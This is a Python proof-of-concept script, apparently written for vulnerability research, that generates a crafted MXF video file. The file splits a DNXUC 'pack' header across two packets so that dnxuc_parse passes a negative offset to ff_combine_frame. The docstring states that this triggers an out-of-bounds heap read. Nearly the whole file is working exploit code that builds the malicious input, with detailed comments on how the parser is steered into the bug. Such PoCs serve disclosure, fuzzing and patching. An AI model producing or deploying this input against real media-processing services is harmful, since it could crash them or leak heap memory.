#!/usr/bin/env python3
"""
PoC generator for VULN-001: OOB Heap Read in ff_combine_frame via dnxuc_parse.

Crafts a minimal MXF file that:
1. Has a DNXUC video stream (triggering the dnxuc_parser)
2. Splits the 8-byte 'pack' header across two separate AVPackets:
   - Packet 1 (7 bytes): \x00\x00\x00\x08\x70\x61\x63  (size=8 + "pac")
   - Packet 2 (1 byte):  \x6b                           ("k")
3. On Packet 2, dnxuc_parse fires at i=0 with pc->index=7 => next=-7 =>
   ff_combine_frame reads 57 bytes from a 1-byte source => heap OOB read.
"""
import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.mxf")

# ── UL / UID constants ──────────────────────────────────────────────────────

# SMPTE Universal Label prefix
def ul(*b): return bytes(b)

# Partition pack key: Header Closed Complete (0x02 0x05 ... 0x02 0x04 0x00)
HEADER_PP_KEY = ul(0x06,0x0e,0x2b,0x34,0x02,0x05,0x01,0x01,
                   0x0d,0x01,0x02,0x01,0x01,0x02,0x04,0x00)

# Operational Pattern OP1a
OP1A_UL = ul(0x06,0x0e,0x2b,0x34,0x04,0x01,0x01,0x01,
             0x0d,0x01,0x02,0x01,0x01,0x01,0x09,0x00)

# DNXUC essence codec UL (PictureEssenceCoding, tag 0x3201)
# => maps to AV_CODEC_ID_DNXUC in ff_mxf_codec_uls (match_len=14)
DNXUC_CODEC_UL = ul(0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x0D,
                    0x04,0x01,0x02,0x02,0x03,0x07,0x01,0x00)

# DNXUC essence container UL (tag 0x3004)
# NOT present in mxf_picture_essence_container_uls => wrapping = UnknownWrapped
# => mxf_parse_structural_metadata sets need_parsing = AVSTREAM_PARSE_TIMESTAMPS
# => parser is invoked for each packet
DNXUC_EC_UL = DNXUC_CODEC_UL  # same UL works; not in picture_essence_container_uls

# Video data definition UL (AVMEDIA_TYPE_VIDEO)
VIDEO_DEF_UL = ul(0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x01,
                  0x01,0x03,0x02,0x02,0x01,0x00,0x00,0x00)

# Essence element key prefix (12 bytes) — standard GC essence element
ESSENCE_KEY_PREFIX = ul(0x06,0x0e,0x2b,0x34,0x01,0x02,0x01,0x01,
                        0x0d,0x01,0x03,0x01)
# Full essence element key (16 bytes): prefix + track_number (4 bytes, any value)
ESSENCE_KEY = ESSENCE_KEY_PREFIX + ul(0x15,0x01,0x0e,0x00)

# ContentStorage key
CS_KEY   = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x18,0x00)
# MaterialPackage key
MPKG_KEY = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x36,0x00)
# SourcePackage key
SPKG_KEY = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x37,0x00)
# Track key
TRK_KEY  = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x3b,0x00)
# Sequence key
SEQ_KEY  = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x0f,0x00)
# SourceClip key
SC_KEY   = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x11,0x00)
# CDCI Descriptor key
DESC_KEY = ul(0x06,0x0e,0x2b,0x34,0x02,0x53,0x01,0x01,
              0x0d,0x01,0x01,0x01,0x01,0x01,0x28,0x00)

# ── Unique IDs for cross-referencing (16 bytes each) ────────────────────────

def uid(n): return bytes([n]) + b'\x00' * 15

UID_CS      = uid(0x10)   # ContentStorage
UID_MPKG    = uid(0x01)   # MaterialPackage
UID_SPKG    = uid(0x02)   # SourcePackage
UID_MTRK    = uid(0x03)   # MaterialTrack
UID_MSEQ    = uid(0x04)   # MaterialSequence
UID_SC1     = uid(0x05)   # SourceClip (in material track)
UID_STRK    = uid(0x06)   # SourceTrack
UID_SSEQ    = uid(0x07)   # SourceSequence
UID_DESC    = uid(0x09)   # Descriptor

# Source Package UMID (32 bytes):
# First 16 = package_ul, next 16 = package_uid
# SourceClip tag 0x1101 must reference this exactly.
SPKG_UMID_UL  = uid(0x20)   # package_ul  (first 16 of UMID)
SPKG_UMID_UID = uid(0x21)   # package_uid (last  16 of UMID)
SPKG_UMID = SPKG_UMID_UL + SPKG_UMID_UID   # 32 bytes

# MaterialPackage UMID (doesn't need to match anything)
MPKG_UMID = uid(0x30) + uid(0x31)   # 32 bytes

# ── Encoding helpers ─────────────────────────────────────────────────────────

def ber_len(n):
    """BER-encode integer n as 1, 2, or 4 bytes."""
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    elif n < 0x10000:
        return bytes([0x82, n >> 8, n & 0xFF])
    else:
        return bytes([0x84]) + struct.pack('>I', n)

def klv(key, value):
    """Encode a KLV: key (16) + BER length + value."""
    return key + ber_len(len(value)) + value

def ltag(tag, value):
    """Encode a local tag: 2-byte tag + 2-byte length + value."""
    assert len(value) < 0x10000
    return struct.pack('>HH', tag, len(value)) + value

def strong_ref_array(uids):
    """Encode a strong reference array: count(4) + size(4) + uid*n."""
    n = len(uids)
    return struct.pack('>II', n, 16) + b''.join(uids)

def local_set(key, tags_data):
    """Encode a local set KLV: key + BER(len(value)) + value."""
    return klv(key, tags_data)

# ── Partition Pack ───────────────────────────────────────────────────────────

def make_header_pp(header_byte_count, this_partition=0):
    """
    Build the Header Partition Pack KLV.
    this_partition = file offset of this KLV's key (must equal actual offset).
    """
    body_sid = 1
    # Essence containers batch: 1 entry (DNXUC EC UL)
    ec_batch = struct.pack('>II', 1, 16) + DNXUC_EC_UL

    value = (
        struct.pack('>HH', 1, 3)           # MajorVersion=1, MinorVersion=3
        + struct.pack('>I', 1)              # KAGSize
        + struct.pack('>Q', this_partition) # ThisPartition
        + struct.pack('>Q', 0)              # PreviousPartition
        + struct.pack('>Q', 0)              # FooterPartition (0 = no footer)
        + struct.pack('>Q', header_byte_count) # HeaderByteCount
        + struct.pack('>Q', 0)              # IndexByteCount
        + struct.pack('>I', 0)              # IndexSID
        + struct.pack('>Q', 0)              # BodyOffset
        + struct.pack('>I', body_sid)       # BodySID
        + OP1A_UL                           # OperationalPattern (16 bytes)
        + struct.pack('>I', 1)              # nb_essence_containers (read by parser)
        # note: the EC UL list after nb_essence_containers is skipped by mxf_parse_klv seek
    )
    return HEADER_PP_KEY + ber_len(len(value)) + value

# ── Metadata Sets ────────────────────────────────────────────────────────────

def make_content_storage():
    v = (ltag(0x3C0A, UID_CS)
         + ltag(0x1901, strong_ref_array([UID_MPKG, UID_SPKG])))
    return klv(CS_KEY, v)

def make_material_package():
    v = (ltag(0x3C0A, UID_MPKG)
         + ltag(0x4401, MPKG_UMID)
         + ltag(0x4403, strong_ref_array([UID_MTRK])))
    return klv(MPKG_KEY, v)

def make_source_package():
    v = (ltag(0x3C0A, UID_SPKG)
         + ltag(0x4401, SPKG_UMID)
         + ltag(0x4403, strong_ref_array([UID_STRK]))
         + ltag(0x4701, UID_DESC))
    return klv(SPKG_KEY, v)

def make_material_track():
    v = (ltag(0x3C0A, UID_MTRK)
         + ltag(0x4801, struct.pack('>I', 1))        # track_id = 1
         + ltag(0x4b01, struct.pack('>II', 25, 1))   # edit_rate = 25/1
         + ltag(0x4803, UID_MSEQ))
    return klv(TRK_KEY, v)

def make_material_sequence():
    v = (ltag(0x3C0A, UID_MSEQ)
         + ltag(0x0201, VIDEO_DEF_UL)
         + ltag(0x1001, strong_ref_array([UID_SC1])))
    return klv(SEQ_KEY, v)

def make_source_clip1():
    """SourceClip in material track: points to SourcePackage."""
    v = (ltag(0x3C0A, UID_SC1)
         + ltag(0x1101, SPKG_UMID)              # source_package_ul + source_package_uid
         + ltag(0x1102, struct.pack('>I', 1))   # source_track_id = 1
         + ltag(0x0202, struct.pack('>Q', 2)))  # duration = 2 frames
    return klv(SC_KEY, v)

def make_source_track():
    v = (ltag(0x3C0A, UID_STRK)
         + ltag(0x4801, struct.pack('>I', 1))        # track_id = 1
         + ltag(0x4b01, struct.pack('>II', 25, 1))   # edit_rate = 25/1
         + ltag(0x4803, UID_SSEQ))
    return klv(TRK_KEY, v)

def make_source_sequence():
    """SourceSequence: must have same data_definition_ul as MaterialSequence."""
    v = (ltag(0x3C0A, UID_SSEQ)
         + ltag(0x0201, VIDEO_DEF_UL)
         + ltag(0x0202, struct.pack('>Q', 2)))  # duration = 2
    return klv(SEQ_KEY, v)

def make_descriptor():
    """
    CDCI descriptor with DNXUC essence_codec_ul (tag 0x3201).
    essence_container_ul (tag 0x3004) = DNXUC_EC_UL (same as codec UL here),
    which is NOT in mxf_picture_essence_container_uls => wrapping = UnknownWrapped
    => need_parsing = AVSTREAM_PARSE_TIMESTAMPS => parser is invoked.
    """
    v = (ltag(0x3C0A, UID_DESC)
         + ltag(0x3201, DNXUC_CODEC_UL)         # PictureEssenceCoding => AV_CODEC_ID_DNXUC
         + ltag(0x3004, DNXUC_EC_UL)            # EssenceContainer (UnknownWrapped)
         + ltag(0x3203, struct.pack('>I', 1920)) # Width
         + ltag(0x3202, struct.pack('>I', 1080)) # Height
         + ltag(0x320C, b'\x00'))                # FullFrame
    return klv(DESC_KEY, v)

# ── Essence elements ─────────────────────────────────────────────────────────

# Packet 1: 7 bytes = big-endian size(=8) + "pac"
# state64 after this: 0x0000_0000_0870_6163  (lower 32 bits = 0x0870_6163, NOT 'pack')
ESSENCE1 = bytes([0x00, 0x00, 0x00, 0x08, 0x70, 0x61, 0x63])

# Packet 2: 1 byte = 'k' = 0x6B
# state64: (prev << 8) | 0x6B = 0x0000_0008_7061_636B
# (uint32_t) = 0x7061_636B = MKBETAG('p','a','c','k') => MATCH at i=0
# next = 0 - 7 = -7 => ff_combine_frame(..., -7, ...) => OOB read
ESSENCE2 = bytes([0x6B])

def make_essence_klv(data):
    return klv(ESSENCE_KEY, data)

# ── Assemble file ─────────────────────────────────────────────────────────────

def build_mxf():
    # Build metadata sets first (to compute their total size for HeaderByteCount)
    cs   = make_content_storage()
    mpkg = make_material_package()
    spkg = make_source_package()
    mtrk = make_material_track()
    mseq = make_material_sequence()
    sc1  = make_source_clip1()
    strk = make_source_track()
    sseq = make_source_sequence()
    desc = make_descriptor()

    metadata = cs + mpkg + spkg + mtrk + mseq + sc1 + strk + sseq + desc

    # The HeaderByteCount in the partition pack is the byte count of all
    # KLV objects in the header partition (metadata). We set it to the
    # total size of all metadata sets (excluding the partition pack itself).
    header_byte_count = len(metadata)

    # Build partition pack at offset 0 (this_partition = 0)
    pp = make_header_pp(header_byte_count, this_partition=0)

    # Essence elements
    e1 = make_essence_klv(ESSENCE1)
    e2 = make_essence_klv(ESSENCE2)

    return pp + metadata + e1 + e2

# ── Main ──────────────────────────────────────────────────────────────────────

data = build_mxf()
with open(OUT, 'wb') as f:
    f.write(data)
print(f"[+] Written {len(data)} bytes to {OUT}")

# Quick sanity check
assert data[:4] == b'\x06\x0e\x2b\x34', "File should start with SMPTE UL prefix"
print("[+] MXF file sanity check passed")
